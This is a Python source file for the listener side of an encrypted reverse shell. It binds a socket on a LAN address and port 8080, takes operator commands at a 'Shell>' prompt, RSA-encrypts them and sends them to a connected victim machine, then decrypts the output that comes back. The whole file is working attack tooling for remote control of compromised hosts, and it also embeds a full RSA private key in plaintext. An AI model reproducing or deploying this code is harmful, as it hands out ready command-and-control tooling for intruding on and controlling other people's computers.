import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def encrypt(message):
    publicKey = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAo41dU8F/yw5NvgBvfvMB
cW6kHxWG3lunMp0y/8D5oHOBzuXrB6DR5O0cK768NwQpueDJIzBUmMO7rwF+UHZG
4h20R8v4WMDItIr9NLrNNMPhXDEIDo9A9NaMsa/PtHztsnlfJbm/sOffwScnKGrH
5cmfzXu2AQA0vA8DUDdr3aJH5gRrPT6t+MNSBh3OskP5lfFa83kk9wwQp3RmDu+R
Sc4x0/4TiBXxZ8o9SikgcYmICUvitd1WOu4TDCdDFBM/aEwWQ5YpG0Oc/isiUwyX
bqJJQ+SScYw2b6jNkxzlw7/B2ZfG1sEubo0BoXHRqMTkzJyi76o8SCG/dWtMHaSg
JXeSHwPxVcIppZ6D8jQt8r2tUaWydSa/xnVfSTZBHe/9PKEsu292tpwr4DD7E4ty
33OmYWreNV8TZ9MK1npf2Lkwq/kqZO/wt3MqoUdd19hc83oYYD19B0PxtMkRmHIk
EZANa986Fws/1Q9i6ZF1KzskZ+Bg9vwCLzUyUWtKd8a1Z97qR1ETOBv9PhuMwIlS
C4KBCuFNnvwdiXthuCalodwKu1ZjOMsX5lFzNPfUVwGg7y4GKI/VKaugdpCAdkiV
kYKEfXrZ30eC2eXR0HuSNT/wCTbzHAYqlgHO8lLoZNubSTyBMoDIqEWRuApjjTFG
IYlvCv4afkIxMzzSAgBPHLkCAwEAAQ==
-----END PUBLIC KEY-----"""
    publicKeyAfterImport = RSA.importKey(publicKey)
    encryptor = PKCS1_OAEP.new(publicKeyAfterImport)
    encryptedMessage = encryptor.encrypt(message)
    return encryptedMessage

def decrypt(data):
    privateKey = """-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""

    privateKeyAfterImport = RSA.importKey(privateKey)
    decryptoMessage = PKCS1_OAEP.new(privateKeyAfterImport)
    dec = decryptoMessage.decrypt(data)
    return dec.decode()

def connect():
    s = socket.socket()
    s.bind(('192.168.68.109', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()

    while True:

        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result))
            except:
                print("[-] unable to decrypt Message!")

connect()

